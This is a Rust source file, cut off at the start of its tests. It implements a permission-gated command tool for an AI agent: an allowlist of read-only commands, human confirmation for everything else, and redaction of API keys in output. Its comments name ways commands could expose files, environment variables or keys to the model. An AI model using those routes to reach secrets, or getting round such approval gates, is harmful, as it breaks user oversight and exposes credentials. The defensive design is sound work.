// SPDX-FileCopyrightText: 2026 ELSOUL LABO B.V.
// SPDX-License-Identifier: Apache-2.0

//! Running a command on the user's own computer, for them.
//!
//! The model names a program and its arguments. There is no shell, so no
//! pipe, redirection, glob or variable is ever expanded. A command that only
//! looks (`uname -a`, `df -h`, `systemctl status x`) runs at once: it is on
//! the list here, in a form the list allows. Anything else is shown to the
//! person word for word and runs only on their yes; they may allow that
//! exact command until the console ends, and then it runs without asking
//! again. A script for the shell (`shell`, for pipes and `&&`) is never on
//! the list; it too can be allowed word for word. Or they may allow every
//! command, scripts too, until the console ends or the conversation is
//! cleared: a second question, its cursor on no, makes sure (a no there
//! runs nothing), and from then on nothing is asked before it runs. A
//! session with no one to ask (`erpc ai -m` in a script, `--json`) runs the
//! listed commands and refuses the rest.
//!
//! The list is narrow on purpose, and says which options and values each
//! program may have rather than which it may not: every program parses its
//! own arguments, and a list of what to refuse misses what it never
//! thought of. What a command prints goes to the model, so nothing on the
//! list prints a file of the model's choosing or the environment (`cat` of
//! any file, `env`, `ps`, `systemctl show` are off it). Logs and service
//! status are on it: what a service logs, or the command line it was
//! started with, reaches the model. On the network, the list reaches the
//! address echo services, the RPC in the user's Solana configuration or a
//! public Solana cluster, the Docker daemon docker is configured for, and
//! the resolver for a name lookup; nothing else.
//!
//! Whatever runs, an `api-key=` value in its output is replaced before the
//! model sees it: an ERPC RPC URL carries the key there.

use core::fmt::Write as _;
use core::future::Future;
use core::pin::Pin;
use core::time::Duration;
use std::process::Stdio;

use serde_json::{Value, json};
use tokio::io::{AsyncRead, AsyncReadExt as _};

use crate::confirm::{Allow, Confirm, Confirmation};
use crate::i18n::t;

type Fut<'a, T> = Pin<Box<dyn Future<Output = Result<T, String>> + 'a>>;

/// How long a command that only looks may run.
const LOOK_LIMIT: Duration = Duration::from_secs(30);
/// How long a command the person agreed to may run.
const AGREED_LIMIT: Duration = Duration::from_secs(300);
/// How long an erpc command that builds or deploys may run, once agreed.
/// A first `erpc worker deploy` builds the app and waits for a new server
/// and for the lines it starts (an Unlimited RPC alone can take 50
/// minutes), and a node's deploy fetches a snapshot: all take longer than
/// five minutes, and one stopped halfway leaves a server bought and
/// nothing on it. A worker's deploy ends by its own waits well inside
/// this. A node's deploy that builds its client from source can take
/// longer still; it picks up where it was when it is run again.
pub const DEPLOY_LIMIT: Duration = Duration::from_mins(90);
/// The most of each of standard output and standard error passed on.
const MAX_OUTPUT: usize = 32 * 1024;
/// The most arguments, and the most characters in all of them.
const MAX_ARGS: usize = 64;
const MAX_CHARS: usize = 16 * 1024;

/// What the model is told when no one can say yes.
const NO_ONE_TO_ASK: &str = "this command changes something or is not on the list that runs \
                             without asking, and no one can say yes here (a script, or --json); \
                             tell the user what to run instead";

/// What a command did.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Ran {
    /// Its exit code; none when a signal ended it or it was stopped.
    pub status: Option<i32>,
    /// What it printed on standard output, as text.
    pub stdout: String,
    /// What it printed on standard error, as text.
    pub stderr: String,
    /// Whether some output was left out, past [`MAX_OUTPUT`].
    pub truncated: bool,
    /// Whether it was stopped for running too long.
    pub timed_out: bool,
}

/// Where commands run.
pub trait Shell {
    /// The folder commands run in, for the person.
    fn folder(&self) -> String;

    /// Runs `command`, the program then its arguments, with nothing on
    /// standard input, for at most `limit`.
    fn run<'a>(&'a self, command: &'a [String], limit: Duration) -> Fut<'a, Ran>;

    /// Whether `command` is one of the shell's own program's that builds
    /// or deploys, and so may run for [`DEPLOY_LIMIT`] once the person
    /// agreed to it. The program that owns the shell answers by reading
    /// the line with its own parser; this crate does not guess at another
    /// program's command line. No, unless a shell says otherwise.
    fn runs_long(&self, command: &[String]) -> bool {
        let _ = command;
        false
    }
}

/// The computer erpc runs on, in the folder it was started in.
#[derive(Debug, Clone, Copy, Default)]
pub struct LocalShell;

impl Shell for LocalShell {
    fn folder(&self) -> String {
        std::env::current_dir().map_or_else(|_| "?".to_owned(), |d| d.display().to_string())
    }

    fn run<'a>(&'a self, command: &'a [String], limit: Duration) -> Fut<'a, Ran> {
        Box::pin(async move {
            let (program, args) = command.split_first().ok_or("no command was given")?;
            let mut builder = tokio::process::Command::new(program);
            builder
                .args(args)
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .kill_on_drop(true);
            // A process group of its own, so what it starts can be stopped
            // with it.
            #[cfg(unix)]
            builder.process_group(0);
            let mut child = builder
                .spawn()
                .map_err(|e| format!("{program} could not be started: {e}"))?;
            // Until it ends by itself, the deadline or dropping this future
            // (Ctrl-C in the console) kills the whole group.
            let mut group = Group::of(child.id());
            let deadline = tokio::time::Instant::now() + limit;
            let (mut out, mut err) = (Capped::default(), Capped::default());
            let (stdout, stderr) = (child.stdout.take(), child.stderr.take());
            let (waited, timed_out, read_all) = {
                let reading = async {
                    tokio::join!(out.fill(stdout), err.fill(stderr));
                };
                tokio::pin!(reading);
                let mut read_all = false;
                let waited = tokio::time::timeout_at(deadline, async {
                    tokio::select! {
                        status = child.wait() => status,
                        () = &mut reading => {
                            read_all = true;
                            child.wait().await
                        }
                    }
                })
                .await;
                let timed_out = waited.is_err();
                if timed_out {
                    group.stop();
                } else {
                    // Ended by itself: what it left running on purpose stays.
                    group.forget();
                }
                // Output still open now is held by something it left running;
                // it is not waited for.
                if !read_all {
                    read_all = tokio::time::timeout(LEFT_OPEN, &mut reading).await.is_ok();
                }
                (waited, timed_out, read_all)
            };
            let status = waited.ok().and_then(Result::ok).and_then(|s| s.code());
            Ok(Ran {
                status,
                truncated: out.cut || err.cut || !read_all,
                stdout: String::from_utf8_lossy(&out.bytes).into_owned(),
                stderr: String::from_utf8_lossy(&err.bytes).into_owned(),
                timed_out,
            })
        })
    }
}

/// How long output is read after the command ends, while something it
/// left running still holds it open.
const LEFT_OPEN: Duration = Duration::from_secs(1);

/// The process groups of the commands running now, for [`stop_live`].
static LIVE: std::sync::Mutex<Vec<u32>> = std::sync::Mutex::new(Vec::new());

/// Kills every command this process is running. For the ways out that run
/// no destructors, a signal's and a panic's that aborts: a command given
/// the long limit would otherwise run on with nobody reading it. It never waits: a
/// list locked elsewhere is left alone.
pub fn stop_live() {
    stop_where(|_| true);
}

/// Kills the running commands whose process group `which` picks, and takes
/// them off the list.
fn stop_where(which: impl Fn(u32) -> bool) {
    if let Ok(mut live) = LIVE.try_lock() {
        live.retain(|&id| {
            let picked = which(id);
            if picked {
                kill_group(id);
            }
            !picked
        });
    }
}

fn kill_group(id: u32) {
    #[cfg(unix)]
    if let Some(pid) = i32::try_from(id)
        .ok()
        .and_then(rustix::process::Pid::from_raw)
    {
        let _ = rustix::process::kill_process_group(pid, rustix::process::Signal::KILL);
    }
    #[cfg(not(unix))]
    let _ = id;
}

/// A running command's process group, killed when this is dropped unless
/// the command ended by itself first.
struct Group(Option<u32>);

impl Group {
    /// The group of a command just started, on the list of those running.
    fn of(id: Option<u32>) -> Self {
        if let (Some(id), Ok(mut live)) = (id, LIVE.lock()) {
            live.push(id);
        }
        Self(id)
    }

    /// Takes the group off the list of those running.
    fn forget(&mut self) -> Option<u32> {
        let id = self.0.take()?;
        if let Ok(mut live) = LIVE.lock() {
            live.retain(|kept| *kept != id);
        }
        Some(id)
    }

    fn stop(&mut self) {
        if let Some(id) = self.forget() {
            kill_group(id);
        }
    }
}

impl Drop for Group {
    fn drop(&mut self) {
        self.stop();
    }
}

/// Output kept up to [`MAX_OUTPUT`]; the rest is read and dropped, so the
/// command never stalls on a full pipe.
#[derive(Default)]
struct Capped {
    bytes: Vec<u8>,
    cut: bool,
}

impl Capped {
    async fn fill(&mut self, from: Option<impl AsyncRead + Unpin>) {
        let Some(mut from) = from else { return };
        let mut buf = vec![0_u8; 8192];
        while let Ok(n @ 1..) = from.read(&mut buf).await {
            let room = MAX_OUTPUT - self.bytes.len();
            self.cut |= n > room;
            self.bytes.extend_from_slice(&buf[..n.min(room)]);
        }
    }
}

/// What `run_command` takes: its properties and the required ones. One
/// of `argv` and `shell`.
pub(crate) fn input_schema() -> (Value, Value) {
    (
        json!({
            "argv": {
                "type": "array",
                "items": { "type": "string" },
                "minItems": 1,
                "maxItems": MAX_ARGS,
                "description": "The program, then each argument as its own item, exactly as it should reach the program: [\"df\", \"-h\"], [\"systemctl\", \"status\", \"nginx\"]. No shell: quotes, pipes, globs and variables are not interpreted.",
            },
            "shell": {
                "type": "string",
                "description": "Instead of argv: a script for sh -c (cmd /C on Windows), when pipes, &&, redirection or globs are really needed. It asks the person first, unless they allowed that exact script or every command.",
            },
        }),
        json!([]),
    )
}

/// Commands the person allowed until the console ends: word for word, or
/// every one.
#[derive(Debug, Default)]
pub struct Allowed {
    commands: core::cell::RefCell<Vec<Vec<String>>>,
    everything: core::cell::Cell<bool>,
}

impl Allowed {
    /// None yet.
    #[must_use]
    pub const fn new() -> Self {
        Self {
            commands: core::cell::RefCell::new(Vec::new()),
            everything: core::cell::Cell::new(false),
        }
    }

    /// Whether `asked` runs without asking.
    fn covers(&self, asked: &Asked) -> bool {
        self.everything.get() || self.commands.borrow().contains(&asked.argv)
    }

    /// Forgets what was allowed: every command included.
    pub fn clear(&self) {
        self.commands.borrow_mut().clear();
        self.everything.set(false);
    }

    /// Every command allowed, as a second yes does.
    #[cfg(test)]
    pub(crate) fn allow_everything(&self) {
        self.everything.set(true);
    }

    /// Whether every command is allowed.
    #[cfg(test)]
    pub(crate) fn everything(&self) -> bool {
        self.everything.get()
    }

    fn add(&self, command: Vec<String>) {
        let mut allowed = self.commands.borrow_mut();
        if !allowed.contains(&command) {
            allowed.push(command);
        }
    }
}

/// A command to run: what runs, and how the person sees it.
struct Asked {
    argv: Vec<String>,
    shown: String,
    /// A script for the shell: asked about even when it only looks, unless
    /// the person allowed it word for word, or every command.
    script: bool,
}

/// The command in the tool's input: `argv`, or a `shell` script.
fn asked(input: &Value) -> Result<Asked, String> {
    match (input.get("argv"), input.get("shell")) {
        (Some(_), None) => {
            let argv = argv(input)?;
            Ok(Asked {
                shown: shown(&argv),
                argv,
                script: false,
            })
        }
        (None, Some(script)) => {
            let script = script
                .as_str()
                .filter(|s| !s.trim().is_empty())
                .ok_or("shell must be the script, as text")?;
            if script.chars().count() > MAX_CHARS || script.contains('\0') {
                return Err(format!(
                    "a script is at most {MAX_CHARS} characters, with no NUL"
                ));
            }
            let argv: Vec<String> = if cfg!(windows) {
                vec!["cmd".to_owned(), "/C".to_owned(), script.to_owned()]
            } else {
                vec!["sh".to_owned(), "-c".to_owned(), script.to_owned()]
            };
            Ok(Asked {
                argv,
                shown: shown_script(script),
                script: true,
            })
        }
        _ => Err("give argv or shell, one of them".to_owned()),
    }
}

/// The command in the tool's input, checked.
fn argv(input: &Value) -> Result<Vec<String>, String> {
    let argv: Vec<String> = input
        .get("argv")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .filter_map(|v| v.as_str().map(str::to_owned))
                .collect()
        })
        .unwrap_or_default();
    let given = input
        .get("argv")
        .and_then(Value::as_array)
        .map_or(0, Vec::len);
    if argv.is_empty() || argv.len() != given || argv[0].is_empty() {
        return Err("argv must be a list of strings, the program first".to_owned());
    }
    if argv.len() > MAX_ARGS || argv.iter().map(|a| a.chars().count()).sum::<usize>() > MAX_CHARS {
        return Err(format!(
            "a command is at most {MAX_ARGS} arguments and {MAX_CHARS} characters"
        ));
    }
    if argv.iter().any(|a| a.contains('\0')) {
        return Err("an argument cannot hold a NUL character".to_owned());
    }
    Ok(argv)
}

/// Runs the command in `input`: at once if it only looks or the person
/// allowed it already, else on the person's yes.
pub(crate) async fn run_command(
    input: &Value,
    confirm: Option<&dyn Confirm>,
    shell: Option<&dyn Shell>,
    allowed: Option<&Allowed>,
) -> Result<Value, String> {
    let asked = asked(input)?;
    let shell = shell.ok_or("this erpc cannot run commands")?;
    let looks = !asked.script && only_looks(&asked.argv);
    if !looks && !allowed.is_some_and(|a| a.covers(&asked)) {
        let confirm = confirm.ok_or(NO_ONE_TO_ASK)?;
        let what = if asked.script {
            t!("confirm.label.script")
        } else {
            t!("confirm.label.command")
        };
        let ask = Confirmation {
            title: t!("confirm.command.title"),
            lines: vec![
                (what, asked.shown.clone()),
                (t!("confirm.label.folder"), shell.folder()),
            ],
        };
        match confirm.allow(&ask).await {
            Allow::No => return Err("the user said no; the command was not run".to_owned()),
            Allow::Once => {}
            // Word for word: a script as written, a command with exactly
            // these arguments.
            Allow::Always => {
                if let Some(allowed) = allowed {
                    allowed.add(asked.argv.clone());
                }
            }
            // The widest answer is made sure of, and a no to that runs
            // nothing, as the person is then told. With nowhere to keep it,
            // it is a yes to this command.
            Allow::Everything => {
                if let Some(allowed) = allowed {
                    if !confirm.confirm(&every_command()).await {
                        return Err("the user said no; the command was not run".to_owned());
                    }
                    allowed.everything.set(true);
                }
            }
        }
    }
    let ran = shell
        .run(&asked.argv, limit_of(&asked, looks, shell))
        .await?;
    Ok(json!({
        "command": asked.shown,
        "exitCode": ran.status,
        "stdout": redacted(&ran.stdout),
        "stderr": redacted(&ran.stderr),
        "truncated": ran.truncated,
        "timedOut": ran.timed_out,
    }))
}

/// How long `asked` may run: a command that only looks, one the person
/// agreed to, or one the shell says builds or deploys. A look is asked
/// first: it runs without a yes, so it never gets the long limit. A script
/// is not asked about: what it runs inside is not a command line the shell
/// can read.
fn limit_of(asked: &Asked, looks: bool, shell: &dyn Shell) -> Duration {
    if looks {
        LOOK_LIMIT
    } else if !asked.script && shell.runs_long(&asked.argv) {
        DEPLOY_LIMIT
    } else {
        AGREED_LIMIT
    }
}

/// The second question before every command is allowed.
fn every_command() -> Confirmation {
    Confirmation {
        title: t!("confirm.every_command.title"),
        lines: vec![
            (t!("confirm.label.ends"), t!("confirm.every_command.ends")),
            (t!("confirm.label.note"), t!("confirm.every_command.note")),
        ],
    }
}

/// `text` with the value of every `api-key`, `api_key`, `apikey` and
/// `...token` parameter replaced: an RPC URL a tool prints, or puts in an
/// error, carries the user's key there. The same names the worker's
/// manifest refuses to carry.
fn redacted(text: &str) -> String {
    const KEYS: [&str; 4] = ["api-key=", "api_key=", "apikey=", "token="];
    // Lowercasing ASCII keeps every byte where it was.
    let lower = text.to_ascii_lowercase();
    let mut out = String::with_capacity(text.len());
    let mut at = 0;
    while let Some(start) = KEYS
        .iter()
        .filter_map(|key| lower[at..].find(key).map(|i| at + i + key.len()))
        .min()
    {
        out.push_str(&text[at..start]);
        out.push_str("REDACTED");
        at = text[start..]
            .find(|c: char| c.is_whitespace() || "&\"'<>()[],;".contains(c))
            .map_or(text.len(), |end| start + end);
    }
    out.push_str(&text[at..]);
    out
}

/// The command in a tool call's input as the console shows it, if it has
/// one.
#[must_use]
pub fn shown_input(input: &Value) -> Option<String> {
    asked(input).ok().map(|asked| asked.shown)
}

/// A shell script as one line a person can read: line breaks and tabs as
/// `\n` and `\t`, every other character that does not show as `\u{…}`,
/// and a backslash as `\\`, so that a `\n` written in the script is not
/// shown the same as a line break.
fn shown_script(script: &str) -> String {
    let mut out = String::with_capacity(script.len());
    for c in script.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() || hidden(c) => {
                let _ = write!(out, "\\u{{{:x}}}", u32::from(c));
            }
            c => out.push(c),
        }
    }
    out
}

/// `argv` as one line a person can read: each argument quoted when it has
/// to be, and every character that does not show (a control character,
/// a bidirectional mark, a zero-width space) written out as `\u{…}` and
/// a backslash as `\\`, so what is shown is what runs.
#[must_use]
pub fn shown(argv: &[String]) -> String {
    let quoted: Vec<String> = argv.iter().map(|a| quote(a)).collect();
    quoted.join(" ")
}

fn quote(arg: &str) -> String {
    if !arg.is_empty()
        && arg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./=:,+@%^".contains(c))
    {
        return arg.to_owned();
    }
    let mut out = String::from("'");
    for c in arg.chars() {
        match c {
            '\'' => out.push_str("'\\''"),
            '\\' => out.push_str("\\\\"),
            c if c.is_control() || hidden(c) => {
                let _ = write!(out, "\\u{{{:x}}}", u32::from(c));
            }
            c => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// Whether `c` takes no room, breaks the line, or reorders the text
/// around it.
const fn hidden(c: char) -> bool {
    matches!(
        c,
        '\u{00AD}'
            | '\u{034F}'
            | '\u{061C}'
            | '\u{180E}'
            | '\u{200B}'..='\u{200F}'
            | '\u{2028}'..='\u{202E}'
            | '\u{2060}'..='\u{206F}'
            | '\u{FE00}'..='\u{FE0F}'
            | '\u{FEFF}'
            | '\u{E0000}'..='\u{E0FFF}'
    )
}

/// The tools whose `--version` runs without asking. Not the ones a
/// version manager usually puts on the path (cargo and rustc through
/// rustup, node, npm, python): those read the folder's toolchain file and
/// may run or install what it names.
const VERSIONED: &[&str] = &[
    "agave-validator",
    "curl",
    "docker",
    "erpc",
    "fdctl",
    "git",
    "jq",
    "solana",
    "solana-keygen",
];

/// The files `cat` may print without asking: what the system is, never
/// what it keeps.
const READABLE_FILES: &[&str] = &[
    "/etc/hostname",
    "/etc/lsb-release",
    "/etc/os-release",
    "/proc/cpuinfo",
    "/proc/loadavg",
    "/proc/meminfo",
    "/proc/uptime",
    "/proc/version",
];

/// The `erpc worker` verbs that only look: the app's state, its log (not
/// followed), what it keeps and what it lacks. With them may come the
/// global flags, `--dir`/`--env` and their values, `-n`/`--lines` for the
/// log and `--waf` for its WAF's, and the app's name. Not `list --prune`,
/// which drops entries from the app index.
fn erpc_looks(args: &[&str]) -> bool {
    const VERBS: &[&[&str]] = &[
        &["worker", "check"],
        &["worker", "list"],
        &["worker", "status"],
        &["worker", "logs"],
        &["worker", "releases"],
        &["worker", "key", "show"],
        &["worker", "key", "balance"],
        &["worker", "secret", "list"],
        &["worker", "firewall", "list"],
        &["worker", "backup", "status"],
    ];
    const WITH_VALUE: &[&str] = &["--dir", "--env", "-e", "-n", "--lines", "--lang"];
    const ALONE: &[&str] = &["--json", "--waf"];
    // Global flags before the verb are fine; `--help` is a look too.
    let mut words = args.iter().copied().filter(|a| *a != "--json");
    let mut verb = Vec::new();
    let mut tail = Vec::new();
    while let Some(word) = words.next() {
        if word == "--lang" {
            words.next();
            continue;
        }
        if word.starts_with("--lang=") {
            continue;
        }
        if verb.len() < 3
            && VERBS
                .iter()
                .any(|v| v.starts_with(&verb) && v.get(verb.len()) == Some(&word))
        {
            verb.push(word);
            if VERBS.contains(&verb.as_slice()) {
                tail.extend(words.by_ref());
                break;
            }
            continue;
        }
        return matches!(word, "--help" | "-h") && (verb.is_empty() || verb[0] == "worker");
    }
    if !VERBS.contains(&verb.as_slice()) {
        return false;
    }
    let mut rest = tail.iter().copied();
    let mut named = false;
    while let Some(word) = rest.next() {
        if WITH_VALUE.contains(&word) {
            if rest.next().is_none_or(|v| v.starts_with('-')) {
                return false;
            }
        } else if let Some((flag, _)) = word.split_once('=') {
            if !WITH_VALUE.contains(&flag) {
                return false;
            }
        } else if ALONE.contains(&word) || matches!(word, "--help" | "-h") {
        } else if word.starts_with('-') || named {
            // -f/--follow keeps running; a second positional is not an app.
            return false;
        } else {
            named = true;
        }
    }
    true
}

/// Whether `command` only looks, and so runs without asking.
#[must_use]
pub fn only_looks(command: &[String]) -> bool {
    let Some((program, args)) = command.split_first() else {
        return false;
    };
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let args = args.as_slice();
    if args == ["--version"] && VERSIONED.contains(&program.as_str()) {
        return true;
    }
    match program.as_str() {
        "erpc" => erpc_looks(args),
        "df" | "free" | "id" | "ls" | "lsb_release" | "nproc" | "pwd" | "sw_vers" | "uname"
        | "uptime" | "vm_stat" | "which" | "whoami" => true,
        "du" => du(args),
        // Not --sysroot, which reads the system's files from another
        // folder.
        "lsblk" | "lscpu" => !args
            .iter()
            .any(|a| a.starts_with("--sysroot") || *a == "-s"),
        // With an argument, macOS's `arch` runs a command.
        "arch" => args.is_empty(),
        // Not -f, -i or -d, which ask the resolver.
        "hostname" => matches!(args, [] | ["-I"]),
        "date" => args.iter().all(|a| {
            a.starts_with('+')
                || ["-u", "--utc", "-R", "--rfc-email"].contains(a)
                || a.starts_with("-I")
                || a.starts_with("--iso-8601")
                || a.starts_with("--rfc-3339=")
        }),
        // Dotted names only: some sysctl builds open `/proc/sys/<name>`
        // as given, so a name with `/` in it reads any file. Not -a, which
        // prints keys as root.
        "sysctl" => {
            let mut names = args
                .iter()
                .skip_while(|a| ["-n", "-N", "-e"].contains(a))
                .peekable();
            names.peek().is_some() && names.all(|a| sysctl_name(a))
        }
        "timedatectl" | "hostnamectl" => matches!(args, [] | ["status"]),
        "cat" => !args.is_empty() && args.iter().all(|a| READABLE_FILES.contains(a)),
        "curl" => curl(args),
        "ip" => ip(args),
        "ss" => ss(args),
        "systemctl" => systemctl(args),
        "journalctl" => journalctl(args),
        "docker" => docker(args),
        "solana" => solana(args),
        _ => false,
    }
}

/// Whether `name` is a sysctl name: words of letters, digits, `_` and `-`,
/// joined by dots. Not a key (`net.ipv4.tcp_fastopen_key`), which root
/// can read.
fn sysctl_name(name: &str) -> bool {
    !name.to_ascii_lowercase().contains("key")
        && name.starts_with(|c: char| c.is_ascii_alphabetic())
        && name.split('.').all(|word| {
            !word.is_empty()
                && word
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        })
}

/// The arguments that are not options, if every option is one of `plain`
/// or `valued`. A valued option takes its own value after `=`, or the next
/// argument unless that looks like an option and is not a number (`-b -1`).
fn positionals<'a>(args: &[&'a str], plain: &[&str], valued: &[&str]) -> Option<Vec<&'a str>> {
    let mut found = Vec::new();
    let mut args = args.iter().copied().peekable();
    while let Some(arg) = args.next() {
        let named = arg
            .split_once('=')
            .filter(|_| arg.starts_with("--"))
            .map(|(name, _)| name);
        if !arg.starts_with('-') || arg == "-" {
            found.push(arg);
        } else if valued.contains(&arg) {
            if args
                .peek()
                .is_some_and(|next| !next.starts_with('-') || next.parse::<i64>().is_ok())
            {
                args.next();
            }
        } else if !plain.contains(&arg) && !named.is_some_and(|name| valued.contains(&name)) {
            return None;
        }
    }
    Some(found)
}

/// `du` with the options that say how to count and nothing more: not
/// `--files0-from` or `-X`, which read a file and can print it.
fn du(args: &[&str]) -> bool {
    const LONG: &[&str] = &[
        "--summarize",
        "--human-readable",
        "--total",
        "--one-file-system",
        "--all",
        "--si",
        "--apparent-size",
    ];
    let mut rest = args.iter();
    while let Some(&arg) = rest.next() {
        let fits = if arg == "-d" || arg == "--max-depth" {
            rest.next().is_some_and(|n| n.parse::<u32>().is_ok())
        } else if let Some(depth) = arg.strip_prefix("--max-depth=") {
            depth.parse::<u32>().is_ok()
        } else if arg.starts_with("--") {
            LONG.contains(&arg)
        } else if let Some(letters) = arg.strip_prefix('-') {
            !letters.is_empty() && letters.chars().all(|c| "achkmsx".contains(c))
        } else {
            true
        };
        if !fits {
            return false;
        }
    }
    true
}

/// `curl -q` of an echo service's address, and nothing more: no path, no
/// other host, no option that writes or follows. `-q`, first, keeps
/// `~/.curlrc` from adding anything to the request.
fn curl(args: &[&str]) -> bool {
    const FLAGS: &[&str] = &[
        "-4",
        "-6",
        "-s",
        "-S",
        "-f",
        "-sS",
        "-fsS",
        "-sSf",
        "--silent",
        "--show-error",
        "--fail",
        "--ipv4",
        "--ipv6",
    ];
    let ["-q", rest @ ..] = args else {
        return false;
    };
    let urls: Vec<&&str> = rest.iter().filter(|a| !FLAGS.contains(a)).collect();
    let [url] = urls.as_slice() else {
        return false;
    };
    let host = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))
        .unwrap_or(url);
    erpc_core::endpoints::ADDRESS_ECHO_HOSTS.contains(&host.strip_suffix('/').unwrap_or(host))
}

/// `ip` showing addresses, routes, links, neighbours or rules. Its verbs
/// match on any prefix (`a` is `add`), so only these exact ones count.
fn ip(args: &[&str]) -> bool {
    const FLAGS: &[&str] = &[
        "-4", "-6", "-br", "-brief", "-s", "-stats", "-d", "-details", "-j", "-json", "-p",
        "-pretty", "-o", "-oneline", "-c", "-color",
    ];
    const OBJECTS: &[&str] = &[
        "a",
        "addr",
        "address",
        "r",
        "route",
        "l",
        "link",
        "n",
        "neigh",
        "neighbor",
        "neighbour",
        "rule",
        "maddr",
        "maddress",
    ];
    const VERBS: &[&str] = &["show", "list", "get"];
    let mut rest = args.iter().skip_while(|a| FLAGS.contains(a));
    let (Some(object), verb) = (rest.next(), rest.next()) else {
        return false;
    };
    OBJECTS.contains(object)
        && verb.is_none_or(|v| VERBS.contains(v))
        && rest.all(|a| !a.starts_with('-'))
}

/// `ss`, without `-K` (which ends sockets), `-D` (which writes a file) or
/// `-r` (which asks the resolver).
fn ss(args: &[&str]) -> bool {
    const LONG: &[&str] = &[
        "--all",
        "--listening",
        "--tcp",
        "--udp",
        "--unix",
        "--raw",
        "--numeric",
        "--processes",
        "--extended",
        "--info",
        "--memory",
        "--summary",
        "--options",
        "--ipv4",
        "--ipv6",
        "--no-header",
    ];
    args.iter().all(|a| {
        if a.starts_with("--") {
            LONG.contains(a)
        } else if let Some(letters) = a.strip_prefix('-') {
            !letters.is_empty() && letters.chars().all(|c| "atulnpxeimosH46w0S".contains(c))
        } else {
            true
        }
    })
}

/// `systemctl` asking how units are, never `show` or `cat`, which print
/// their environment.
fn systemctl(args: &[&str]) -> bool {
    const VERBS: &[&str] = &[
        "status",
        "is-active",
        "is-enabled",
        "is-failed",
        "list-units",
        "list-unit-files",
        "list-timers",
    ];
    const PLAIN: &[&str] = &[
        "--no-pager",
        "--all",
        "-a",
        "-l",
        "--full",
        "--failed",
        "--plain",
        "--no-legend",
        "--user",
        "--system",
        "-q",
        "--quiet",
    ];
    const VALUED: &[&str] = &["-n", "--lines", "-t", "--type", "--state", "-o", "--output"];
    plain_output(args)
        && positionals(args, PLAIN, VALUED)
            .is_some_and(|p| p.first().is_some_and(|v| VERBS.contains(v)))
}

/// `journalctl` reading, without following and without the options that
/// rotate, vacuum or flush the journal.
fn journalctl(args: &[&str]) -> bool {
    const PLAIN: &[&str] = &[
        "--no-pager",
        "-r",
        "--reverse",
        "-k",
        "--dmesg",
        "-q",
        "--quiet",
        "-x",
        "--catalog",
        "-e",
        "--pager-end",
        "--utc",
        "--no-hostname",
        "-a",
        "--all",
        "--system",
        "--user",
        "--list-boots",
        "--disk-usage",
    ];
    const VALUED: &[&str] = &[
        "-u",
        "--unit",
        "--user-unit",
        "-n",
        "--lines",
        "-p",
        "--priority",
        "-o",
        "--output",
        "-S",
        "--since",
        "-U",
        "--until",
        "-t",
        "--identifier",
        "-g",
        "--grep",
        "-b",
        "--boot",
    ];
    plain_output(args) && positionals(args, PLAIN, VALUED).is_some()
}

/// Whether every journal output format named in `args` is one of the
/// short ones: `verbose`, `json` and `export` add each process's command
/// line.
fn plain_output(args: &[&str]) -> bool {
    const SHORT: &[&str] = &[
        "short",
        "short-full",
        "short-iso",
        "short-iso-precise",
        "short-precise",
        "short-monotonic",
        "short-unix",
        "cat",
        "with-unit",
    ];
    args.iter().enumerate().all(|(i, a)| match *a {
        "-o" | "--output" => args.get(i + 1).is_some_and(|v| SHORT.contains(v)),
        a => a
            .strip_prefix("--output=")
            .is_none_or(|v| SHORT.contains(&v)),
    })
}

/// `docker` listing containers and images or reading logs, without
/// following them.
fn docker(args: &[&str]) -> bool {
    // These options apply after the subcommand too, and point docker at
    // another daemon.
    let elsewhere = |a: &&str| {
        ["-H", "--host", "-c", "--context", "--config", "--tls"]
            .iter()
            .any(|o| a.starts_with(o))
    };
    if args.iter().any(elsewhere) {
        return false;
    }
    match args {
        // Not --no-trunc or --format, which print each container's whole
        // command.
        ["ps" | "images", rest @ ..] => !rest
            .iter()
            .any(|a| a.starts_with("--no-trunc") || a.starts_with("--format")),
        ["version" | "info", ..] => true,
        ["stats", rest @ ..] => rest.contains(&"--no-stream"),
        ["logs", rest @ ..] => !rest.iter().any(|a| {
            let short = a.starts_with('-') && !a.starts_with("--");
            a.starts_with("--follow") || (short && a.contains('f'))
        }),
        _ => false,
    }
}

/// `solana` reading the chain, from the RPC in its configuration or a
/// public cluster named by its short name. Only the options listed here,
/// each with a value listed here: not `-k` or `-C`, which name files, not
/// `--ws` or a URL, which reach any host, not `-o`, which writes a file,
/// and not `config get` or `-v`, which print the RPC URL and the API key
/// in it.
fn solana(args: &[&str]) -> bool {
    const READS: &[&str] = &[
        "account",
        "address",
        "balance",
        "block-height",
        "block-production",
        "block-time",
        "cluster-version",
        "epoch",
        "epoch-info",
        "genesis-hash",
        "gossip",
        "inflation",
        "leader-schedule",
        "slot",
        "stake-account",
        "stakes",
        "supply",
        "transaction-count",
        "validators",
        "vote-account",
    ];
    const CLUSTERS: &[&str] = &[
        "m",
        "mainnet-beta",
        "t",
        "testnet",
        "d",
        "devnet",
        "l",
        "localhost",
    ];
    let mut words = Vec::new();
    let mut rest = args.iter();
    while let Some(&arg) = rest.next() {
        if !arg.starts_with('-') {
            words.push(arg);
            continue;
        }
        if arg == "--lamports" {
            continue;
        }
        let (name, attached) = match arg.split_once('=') {
            Some((name, value)) if name.starts_with("--") => (name, Some(value)),
            _ => (arg, None),
        };
        let allowed: &[&str] = match name {
            "-u" | "--url" => CLUSTERS,
            "--output" => &["json", "json-compact", "display"],
            "--commitment" => &["processed", "confirmed", "finalized"],
            _ => return false,
        };
        let Some(value) = attached.or_else(|| rest.next().copied()) else {
            return false;
        };
        if !allowed.contains(&value) {
            return false;
        }
    }
    words.first().is_some_and(|sub| READS.contains(sub))
}

#[cfg(test)]
mod tests {
    use super::{only_looks, shown};
    use serde_json::json;

    fn looks(command: &str) -> bool {
        let argv: Vec<String> = command.split_whitespace().map(str::to_owned).collect();
        only_looks(&argv)
    }

    #[test]
